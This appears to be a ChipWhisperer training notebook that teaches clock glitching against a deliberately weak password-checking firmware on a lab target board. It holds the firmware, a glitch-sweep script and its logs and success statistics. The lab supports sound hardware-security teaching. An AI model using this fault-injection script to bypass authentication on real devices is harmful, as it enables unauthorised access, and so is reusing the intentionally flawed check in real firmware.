# Part 1, Topic 2: Clock Glitching to Bypass Password

---
NOTE: This lab references some (commercial) training material on [ChipWhisperer.io](https://www.ChipWhisperer.io). You can freely execute and use the lab per the open-source license (including using it in your own courses if you distribute similarly), but you must maintain notice about this source location. Consider joining our training course to enjoy the full experience.

---

**SUMMARY:** *In the previous lab, we learned how clock glitching can be used to cause a target to behave unexpectedly. In this lab, we'll look at a slightly more realistic example - glitching past a password check*

**LEARNING OUTCOMES:**

* Applying previous glitch settings to new firmware
* Checking for success and failure when glitching

## Firmware

We've already seen how we can insert clock gliches to mess up a calculation that a target is trying to make. While this has many applications, some which will be covered in Fault_201, let's take a look at something a little closer to our original example of glitch vulnerable code: a password check. No need to change out firmware here, we're still using the simpleserial-glitch project (though we'll go through all the build stuff again).

The code is as follows for the password check:

```C
uint8_t password(uint8_t* pw)
{
    char passwd[] = "touch";
    char passok = 1;
    int cnt;

    trigger_high();

    //Simple test - doesn't check for too-long password!
    for(cnt = 0; cnt < 5; cnt++){
        if (pw[cnt] != passwd[cnt]){
            passok = 0;
        }
    }
    
    trigger_low();
    
    simpleserial_put('r', 1, (uint8_t*)&passok);
    return passok;
}
```

There's really nothing out of the ordinary here - it's just a simple password check. We can communicate with it using the `'p'` command.

In [1]:
SCOPETYPE = 'OPENADC'
PLATFORM = 'CWHUSKY'
SS_VER = 'SS_VER_2_1'

In [2]:
%%bash -s "$PLATFORM" "$SS_VER"
cd ../../../firmware/mcu/simpleserial-glitch
make PLATFORM=$1 CRYPTO_TARGET=NONE SS_VER=$2 -j

SS_VER set to SS_VER_2_1
SS_VER set to SS_VER_2_1
arm-none-eabi-gcc (15:10.3-2021.07-4) 10.3.1 20210621 (release)
Copyright (C) 2020 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

mkdir -p objdir-CWHUSKY 
.
Welcome to another exciting ChipWhisperer target build!!
.
.
.
.
.
Compiling:
Compiling:
Compiling:
Compiling:
Compiling:
-en     simpleserial-glitch.c ...
.
-en     .././hal//sam4s/startup_sam4s.c ...
-en     .././simpleserial/simpleserial.c ...
-en     .././hal//sam4s/sam4s_hal.c ...
-en     .././hal/hal.c ...
Compiling:
.
-en     .././hal//sam4s/uart.c ...
Compiling:
.
.
.
-en     .././hal//sam4s/pio.c ...
Compiling:
Compiling:
Compiling:
-en     .././hal//sam4s/system_sam4s.c ...
-en     .././hal//sam4s/sysclk.c ...
-en     .././hal//sam4s/pmc.c ...
-e Done!
-e Done!
-e Done!
-e Done!
-e Done!
-e Done!
-e Done!
-e Done!
-e Done!
-e Done!
.
LINKI

In [3]:
%run "../../Setup_Scripts/Setup_Generic.ipynb"

INFO: Found ChipWhisperer😍
scope.gain.gain                          changed from 0                         to 22                       
scope.gain.db                            changed from 15.0                      to 25.091743119266056       
scope.adc.samples                        changed from 131124                    to 5000                     
scope.clock.clkgen_freq                  changed from 0                         to 7363636.363636363        
scope.clock.adc_freq                     changed from 0                         to 29454545.454545453       
scope.clock.adc_rate                     changed from 0.0                       to 29454545.454545453       
scope.io.tio1                            changed from serial_tx                 to serial_rx                
scope.io.tio2                            changed from serial_rx                 to serial_tx                
scope.io.hs2                             changed from None                      to clkgen            

In [4]:
fw_path = "../../../firmware/mcu/simpleserial-glitch/simpleserial-glitch-{}.hex".format(PLATFORM)
cw.program_target(scope, prog, fw_path)
if SS_VER == 'SS_VER_2_1':
    target.reset_comms()

In [5]:
def reboot_flush():
    reset_target(scope)
    #Flush garbage too
    target.flush()

If we send a wrong password:

In [6]:
#Do glitch loop
reboot_flush()
pw = bytearray([0x00]*5)
target.simpleserial_write('p', pw)

val = target.simpleserial_read_witherrors('r', 1, glitch_timeout=10)#For loop check
valid = val['valid']
if valid:
    response = val['payload']
    raw_serial = val['full_response']
    error_code = val['rv']

print(val)

{'valid': True, 'payload': CWbytearray(b'00'), 'full_response': CWbytearray(b'00 72 01 00 99 00'), 'rv': bytearray(b'\x00')}


We get a response of zero. But if we send the correct password:

In [7]:
#Do glitch loop
reboot_flush()
pw = bytearray([0x74, 0x6F, 0x75, 0x63, 0x68]) # correct password ASCII representation
target.simpleserial_write('p', pw)


val = target.simpleserial_read_witherrors('r', 1, glitch_timeout=10)#For loop check
valid = val['valid']
if valid:
    response = val['payload']
    raw_serial = val['full_response']
    error_code = val['rv']

print(val)

{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}


We get a 1 back. Set the glitch up as in the previous part:

In [8]:
scope.cglitch_setup()

Update the code below to also add an ext offset parameter:

In [9]:
gc = cw.GlitchController(groups=["success", "reset", "normal"], parameters=["width", "offset", "ext_offset"])
gc.display_stats()

IntText(value=0, description='success count:', disabled=True)

IntText(value=0, description='reset count:', disabled=True)

IntText(value=0, description='normal count:', disabled=True)

FloatSlider(value=0.0, continuous_update=False, description='width setting:', disabled=True, max=10.0, readout…

FloatSlider(value=0.0, continuous_update=False, description='offset setting:', disabled=True, max=10.0, readou…

FloatSlider(value=0.0, continuous_update=False, description='ext_offset setting:', disabled=True, max=10.0, re…

Like before, we'll plot our settings. The plot is 2D, so you'll need to make a decision about what to plot. In this case, we'll plot offset and ext_offset, but pick whichever you like:

In [10]:
gc.glitch_plot(plotdots={"success":"+g", "reset":"xr", "normal":None}, x_index="ext_offset", y_index="offset")

:DynamicMap   []
   :Overlay
      .Points.I  :Points   [ext_offset,offset]
      .Points.II :Points   [ext_offset,offset]

And make a glitch loop. Make sure you use some successful settings that you found in the previous lab, since it will make this one much shorter!

One change you probably want to make is to add a scan for ext_offset. The number of places we can insert a successful glitch has gone way down. Doing this will also be very important for future labs.

In [12]:
from tqdm.notebook import tqdm
import re
import struct

# Password to send. Use the near-miss first to prove the glitch setup works;
# switch to the all-zero one for the real exercise.
test_pw = bytearray(b'touc\x00')      # near-miss: only the last byte is wrong
# test_pw = bytearray([0]*5)          # real attack: all bytes wrong

if scope._is_husky:
    # Husky: width/offset are in phase-shift steps (see help(scope.glitch)).
    gc.set_range("width", 0, 800)
    gc.set_range("offset", 1300, 3200)
    gc.set_global_step([400, 200, 100])
    scope.adc.lo_gain_errors_disabled = True
    scope.adc.clip_errors_disabled = True
else:
    gc.set_range("width", 0.8, 3.6)      # CW-Lite ARM values
    gc.set_range("offset", -4, -2)
    gc.set_global_step(0.4)

gc.set_range("ext_offset", 0, 100)
gc.set_step("ext_offset", 1)

max_successes = 5
successes = 0

scope.glitch.repeat = 1
scope.adc.timeout = 0.5
reboot_flush()

for glitch_settings in gc.glitch_values():
    scope.glitch.width = glitch_settings[0]
    scope.glitch.offset = glitch_settings[1]
    scope.glitch.ext_offset = glitch_settings[2]

    if scope.adc.state:
        print("Trigger still high!")
        gc.add("reset")
        reboot_flush()          # no 'continue': still test this setting

    scope.arm()
    target.simpleserial_write('p', test_pw)

    ret = scope.capture()
    if ret:
        print('Timeout - no trigger')
        gc.add("reset")
        reboot_flush()
        continue

    val = target.simpleserial_read_witherrors('r', 1, glitch_timeout=10, timeout=50)
    if val['valid'] is False:
        gc.add("reset")
    elif val['payload'] == bytearray([1]):
        gc.add("success")
        print(val['payload'])
        print(scope.glitch.width, scope.glitch.offset, scope.glitch.ext_offset)
        print("🐙", end="")
        successes += 1
        if successes >= max_successes:
            break
    else:
        gc.add("normal")

print("\nDone glitching")

Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!


(ChipWhisperer Target WARNING|File SimpleSerial2.py:533) Read timed out: 
(ChipWhisperer Target ERROR|File SimpleSerial2.py:292) Device did not ack
(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:730) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 13
(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:730) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 12


Timeout - no trigger
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
CWbytearray(b'01')
0 2300 95
🐙

(ChipWhisperer Target WARNING|File SimpleSerial2.py:533) Read timed out: 
(ChipWhisperer Target ERROR|File SimpleSerial2.py:292) Device did not ack
(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:730) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 13
(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:730) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 12


Timeout - no trigger
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!


(ChipWhisperer Target WARNING|File SimpleSerial2.py:533) Read timed out: 
(ChipWhisperer Target ERROR|File SimpleSerial2.py:292) Device did not ack
(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:730) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 13
(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:730) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 12


... (29 outputs left out)

(ChipWhisperer Target WARNING|File SimpleSerial2.py:533) Read timed out: 
(ChipWhisperer Target ERROR|File SimpleSerial2.py:292) Device did not ack
(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:730) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 13
(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:730) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 12


Timeout - no trigger
Trigger still high!
CWbytearray(b'01')
400 2300 94
🐙Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!


(ChipWhisperer Target WARNING|File SimpleSerial2.py:533) Read timed out: 
(ChipWhisperer Target ERROR|File SimpleSerial2.py:292) Device did not ack
(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:730) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 13
(ChipWhisperer Scope WARNING|File _OpenADCInterface.py:730) Timeout in OpenADC capture(), no trigger seen! Trigger forced, data is invalid. Status: 12


Timeout - no trigger
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
Trigger still high!
CWbytearray(b'01')
600 2300 95
🐙
Done glitching


For this lab, you may want two copies of your results; one for finding effective ext_offsets:

In [13]:
results = gc.calc(ignore_params=["width", "offset"], sort="success_rate")
results

[((95,),
  {'total': 572,
   'success': 3,
   'success_rate': 0.005244755244755245,
   'reset': 5,
   'reset_rate': 0.008741258741258742,
   'normal': 564,
   'normal_rate': 0.986013986013986}),
 ((99,),
  {'total': 566,
   'success': 1,
   'success_rate': 0.0017667844522968198,
   'reset': 0,
   'reset_rate': 0.0,
   'normal': 565,
   'normal_rate': 0.9982332155477032}),
 ((94,),
  {'total': 569,
   'success': 1,
   'success_rate': 0.0017574692442882249,
   'reset': 7,
   'reset_rate': 0.012302284710017574,
   'normal': 561,
   'normal_rate': 0.9859402460456942}),
 ((100,),
  {'total': 566,
   'success': 0,
   'success_rate': 0.0,
   'reset': 0,
   'reset_rate': 0.0,
   'normal': 566,
   'normal_rate': 1.0}),
 ((98,),
  {'total': 566,
   'success': 0,
   'success_rate': 0.0,
   'reset': 0,
   'reset_rate': 0.0,
   'normal': 566,
   'normal_rate': 1.0}),
 ((97,),
  {'total': 566,
   'success': 0,
   'success_rate': 0.0,
   'reset': 0,
   'reset_rate': 0.0,
   'normal': 566,
   'normal_

And one for your width/offset settings:

In [14]:
results = gc.calc(ignore_params=["ext_offset"], sort="success_rate")
results

[((600, 2300),
  {'total': 609,
   'success': 1,
   'success_rate': 0.0016420361247947454,
   'reset': 24,
   'reset_rate': 0.03940886699507389,
   'normal': 584,
   'normal_rate': 0.9589490968801314}),
 ((200, 2300),
  {'total': 615,
   'success': 1,
   'success_rate': 0.0016260162601626016,
   'reset': 38,
   'reset_rate': 0.061788617886178863,
   'normal': 576,
   'normal_rate': 0.9365853658536586}),
 ((400, 2300),
  {'total': 1234,
   'success': 2,
   'success_rate': 0.0016207455429497568,
   'reset': 76,
   'reset_rate': 0.06158833063209076,
   'normal': 1156,
   'normal_rate': 0.9367909238249594}),
 ((0, 2300),
  {'total': 622,
   'success': 1,
   'success_rate': 0.001607717041800643,
   'reset': 44,
   'reset_rate': 0.0707395498392283,
   'normal': 577,
   'normal_rate': 0.927652733118971}),
 ((600, 2200),
  {'total': 301,
   'success': 0,
   'success_rate': 0.0,
   'reset': 0,
   'reset_rate': 0.0,
   'normal': 301,
   'normal_rate': 1.0}),
 ((600, 2000),
  {'total': 301,
   's

In [15]:
scope.dis()
target.dis()